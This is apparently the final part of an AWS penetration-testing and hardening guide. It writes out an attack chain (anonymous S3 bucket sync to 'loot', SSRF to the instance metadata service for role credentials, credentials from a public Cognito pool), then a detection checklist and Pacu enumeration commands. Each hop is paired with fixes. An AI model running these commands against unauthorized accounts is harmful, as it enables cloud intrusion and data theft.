*Telemetry:* `GetCallerIdentity` from an unfamiliar IP; GuardDuty may flag the source. *Fix:* secret scanning in repos/CI (git-secrets, trufflehog), auto-rotate leaked keys, deny console/API from unexpected geographies via SCP/conditions.

**Hop 1 — Public S3 exposure.**

```bash
curl -s https://companyname-backups.s3.amazonaws.com/            # lists if public
aws s3 ls s3://companyname-backups --no-sign-request             # anonymous list
aws s3 sync s3://companyname-backups ./loot --no-sign-request    # anonymous read
```

*Telemetry:* only if S3 **data events**/access logging enabled. *Fix:* **Block Public Access**, bucket policy least privilege, data-event logging, Macie.

**Hop 2 — App SSRF → IMDS (if you find a vulnerable app).**

```
GET /img?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
→ ASIA... creds  → load and continue as Black box (I)
```

*Fix:* IMDSv2 required; fix SSRF.

**Hop 3 — Public Cognito unauth identity pool → AWS creds.**

```bash
aws cognito-identity get-id --identity-pool-id <public-id>
aws cognito-identity get-credentials-for-identity --identity-id <idId>
# -> temporary creds for the unauth role; enumerate what it can reach
```

*Telemetry:* `GetId`/`GetCredentialsForIdentity`. *Fix:* disable unauthenticated access or strip the unauth role to nothing.

**Hop 4 — Converge.** Any credential obtained above → run **enumerate-iam**/Pacu and follow the internal methodology (§18 Black box I → privesc → data).

**Chain:** OSINT/leaked key **or** public S3 **or** SSRF **or** public Cognito → a live principal → standard internal escalation. **Every entry point is a single misconfig with a one-line fix.**

---

## 22. Defense / Hardening Master Checklist

- **Identity:** least privilege; **scope**`iam:PassRole` to explicit ARNs; no `iam:*` wildcards; permission boundaries + SCP guardrails; MFA on sensitive actions and root; no root access keys.
- **Credentials:** **IMDSv2 required** (hop-limit 1); short-lived STS; no secrets in user-data/env/images/buildspecs; scan repos/CI; rotate on exposure.
- **Trust:** explicit-principal role trust; `ExternalId`**+MFA** cross-account; short sessions.
- **Data:** S3 **Block Public Access**; SSE-KMS + tight key policies; private/encrypted snapshots; no public RDS; least-privilege DynamoDB/EFS.
- **Detection:** org multi-region **CloudTrail** (+data events, log-file validation, locked S3) → SIEM; **GuardDuty** all regions/accounts; **Config** rules; **Security Hub**; alarms on IAM `Create/Attach/Put`, `CreatePolicyVersion`, `UpdateAssumeRolePolicy`, `GetSecretValue`/`GetParametersByPath` bursts, `AssumeRole` anomalies, high `AccessDenied`, **trail tampering**.
- **Guardrails:** SCPs to deny dangerous actions/regions; **Firewall Manager** org-wide WAF/SG; Inspector vuln scanning; Macie sensitive-data discovery; secret scanning in CI/repos.

---

## 23. AWS CLI & Pacu Quick Reference + Glossary

**Fast triage after getting creds (authorized):**

```bash
aws sts get-caller-identity
aws iam get-account-authorization-details 2>/dev/null | head
enumerate-iam --access-key AKIA... --secret-key ...
aws s3 ls; aws secretsmanager list-secrets; aws ssm describe-parameters
aws ec2 describe-instances --query 'Reservations[].Instances[].IamInstanceProfile'
aws lambda list-functions --query 'Functions[].[FunctionName,Role]'
aws kms list-keys; aws rds describe-db-instances --query 'DBInstances[].PubliclyAccessible'
```

**Pacu one-liners:**

```text
import_keys target; whoami
run iam__enum_permissions; run iam__privesc_scan
run ec2__enum; run ec2__download_userdata
run s3__bucket_finder; run secrets__enum; run lambda__enum
run detection__enum_services          # see logging posture
```

**Key-prefix tell:** `AKIA…` = long-lived user key · `ASIA…` = temporary STS (role/session) creds.

**Glossary:**

- **IAM / STS** — identity & access mgmt / temporary-credential service (`AssumeRole`).
- **Role / instance profile** — assumable identity / the EC2 attachment wrapper.
- **PassRole** — permission to hand a role to a service; the top privesc primitive.
- **SCP / permission boundary** — Organizations guardrail / max-permission cap.
- **IMDS** — EC2 metadata service (vends role creds; enforce **v2**).
- **Resource policy** — policy on a resource (S3/KMS/SQS/SNS/Lambda) governing cross-principal access.
- **Confused deputy** — abusing an over-trusting role/service; countered by `ExternalId`.
- **CloudTrail / GuardDuty / Config / Security Hub / Detective / Macie / Inspector** — audit log / threat detection / config-compliance / findings aggregation / investigation graph / sensitive-data discovery / vuln scanning.

---

*End of guide. All commands are enumeration/verification templates for authorized AWS accounts only. Every offensive vector is paired with "Detect & Harden," and both worked chains demonstrate the ARTE thesis: chains are built from single fixable misconfigurations — prove the chain, then remediate every hop.*

{% endraw %}
